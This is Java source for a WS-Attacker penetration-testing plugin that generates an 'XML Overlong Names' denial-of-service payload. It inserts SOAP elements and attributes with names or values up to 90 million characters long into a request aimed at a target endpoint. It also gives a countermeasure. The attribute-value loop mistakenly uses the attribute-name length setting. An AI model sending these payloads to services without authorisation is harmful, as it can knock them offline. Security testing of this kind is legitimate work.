/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2012 Andreas Falkenberg
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.plugin.dos;

import java.util.HashMap;
import java.util.Map;
import wsattacker.main.composition.plugin.option.AbstractOptionInteger;
import wsattacker.main.plugin.option.OptionLimitedInteger;
import wsattacker.main.plugin.option.OptionSimpleBoolean;
import wsattacker.plugin.dos.dosExtension.abstractPlugin.AbstractDosPlugin;
import wsattacker.plugin.dos.dosExtension.option.OptionTextAreaSoapMessage;

public class XmlOverlongNames
    extends AbstractDosPlugin
{

    // Mandatory DOS-specific Attributes - Do NOT change!
    // <editor-fold defaultstate="collapsed" desc="Autogenerated Attributes">
    private static final long serialVersionUID = 1L;

    // </editor-fold>
    // Custom Attributes
    private OptionSimpleBoolean useLengthOfElementName;

    private AbstractOptionInteger lengthOfElementName;

    private OptionSimpleBoolean useLengthOfAttributeName;

    private AbstractOptionInteger lengthOfAttributeName;

    private OptionSimpleBoolean useLengthOfAttributeValue;

    private AbstractOptionInteger lengthOfAttributeValue;

    @Override
    public void initializeDosPlugin()
    {
        initData();
        // Custom Initilisation
        useLengthOfElementName =
            new OptionSimpleBoolean( "XML overlong element name", true,
                                     "checked = XML overlong element name attack enabled" );
        lengthOfElementName =
            new OptionLimitedInteger( "XML overlong element name: Length", 100000, "Length of overlong element name",
                                      2, 90000000 );
        useLengthOfAttributeName =
            new OptionSimpleBoolean( "XML overlong attribute name", true,
                                     "checked = XML overlong attribute name attack enabled" );
        lengthOfAttributeName =
            new OptionLimitedInteger( "XML overlong attribute name: Length", 100000,
                                      "Length of overlong attribute name", 2, 90000000 );
        useLengthOfAttributeValue =
            new OptionSimpleBoolean( "XML overlong attribute value", true,
                                     "checked = XML overlong attribute value attack enabled" );
        lengthOfAttributeValue =
            new OptionLimitedInteger( "XML overlong attribute value: Lenght", 100000,
                                      "Length of overlong attribute value", 2, 90000000 );

        getPluginOptions().add( useLengthOfElementName );
        getPluginOptions().add( lengthOfElementName );
        getPluginOptions().add( useLengthOfAttributeName );
        getPluginOptions().add( lengthOfAttributeName );
        getPluginOptions().add( useLengthOfAttributeValue );
        getPluginOptions().add( lengthOfAttributeValue );

    }

    public AbstractOptionInteger getOptionLengthOfElementName()
    {
        return lengthOfElementName;
    }

    public OptionSimpleBoolean getUseLengthOfElementName()
    {
        return useLengthOfElementName;
    }

    public AbstractOptionInteger getOptionLengthOfAttributeName()
    {
        return lengthOfAttributeName;
    }

    public OptionSimpleBoolean getUseLengthOfAttributeName()
    {
        return useLengthOfAttributeName;
    }

    public AbstractOptionInteger getOptionLengthOfAttributeValue()
    {
        return lengthOfAttributeValue;
    }

    public OptionSimpleBoolean getUseLengthOfAttributeValue()
    {
        return useLengthOfAttributeValue;
    }

    @Override
    public OptionTextAreaSoapMessage.PayloadPosition getPayloadPosition()
    {
        return OptionTextAreaSoapMessage.PayloadPosition.HEADERLASTCHILDELEMENT;
    }

    public void initData()
    {
        setName( "XML Overlong Names Attack" );
        setDescription( "<html><p>This attack checks whether or not a Web service is vulnerable to the \"XML Overlong Names\" attack.</p>"
            + "<p>A vulnerable Web service will run out of resources when trying to parse an XML message with overlong names.</p>"
            + "<p>A detailed description of the attack can be found on <a href=\"http://clawslab.nds.rub.de/wiki/index.php/XML_MegaTags\">http://clawslab.nds.rub.de/wiki/index.php/XML_MegaTags</a>./p>"
            + "<p>The attack algorithm replaces the string $$PAYLOADELEMENT$$ in the SOAP message below "
            + "with the payload defined in parameter 8-10.</p>"
            + "<p>The placeholder $$PAYLOADELEMENT$$ can be set to any other position in the SOAP message</p>"
            + "<p>The following parameters can be used to insert overlong names:</p><ul>"
            + "<li>Param 8.1: Only if enabled,length of an overlong element name in kb</li>"
            + "<li>Param 9.1: Only if enabled, length of an overlong attribute name in kb</li>"
            + "<li>Param 10.1: Only if enabled, length of overlong attribute content in kb</li>"
            + "</ul>"
            + "<p>The attack parameters 8, 9 and 10 are independent of each other. "
            + "Each subattack will be inserted in a seperate element. "
            + "A change in one parameter has no effect on the other.</p></html>" );
        setCountermeasures( "In order to counter the attack, strict XML schema validation should be performed to catch these oversized nodes and values." );
    }

    @Override
    public void createTamperedRequest()
    {

        StringBuilder sb = new StringBuilder( "" );

        // elementname
        if ( useLengthOfElementName.isOn() )
        {
            sb.append( "<" );
            for ( int i = 1; i < ( lengthOfElementName.getValue() ); i++ )
            {
                sb.append( "A" );
            }
            sb.append( ">test</" );
            for ( int i = 1; i < ( lengthOfElementName.getValue() ); i++ )
            {
                sb.append( "A" );
            }
            sb.append( ">" );
        }

        // attributename
        if ( useLengthOfAttributeName.isOn() )
        {
            sb.append( "<abc " );
            for ( int i = 1; i < ( lengthOfAttributeName.getValue() ); i++ )
            {
                sb.append( "B" );
            }
            sb.append( "=\"test\">value</abc>" );
        }

        // attributecontent
        if ( useLengthOfAttributeValue.isOn() )
        {
            sb.append( "<def long=\"" );
            for ( int i = 1; i < ( lengthOfAttributeName.getValue() ); i++ )
            {
                sb.append( "C" );
            }
            sb.append( "\">value</def>" );
        }

        // replace "Payload-Attribute" with Payload-String
        String soapMessage = this.getOptionTextAreaSoapMessage().getValue();
        String soapMessageFinal =
            this.getOptionTextAreaSoapMessage().replacePlaceholderWithPayload( soapMessage, sb.toString() );

        // get HeaderFields from original request, if required add custom
        // headers - make sure to clone!
        Map<String, String> httpHeaderMap = new HashMap<String, String>();
        for ( Map.Entry<String, String> entry : getOriginalRequestHeaderFields().entrySet() )
        {
            httpHeaderMap.put( entry.getKey(), entry.getValue() );
        }

        // write payload and header to TamperedRequestObject
        this.setTamperedRequestObject( httpHeaderMap, getOriginalRequest().getEndpoint(), soapMessageFinal );
    }
    // ----------------------------------------------------------
    // All custom DOS-Attack specific Methods below!
    // ----------------------------------------------------------
}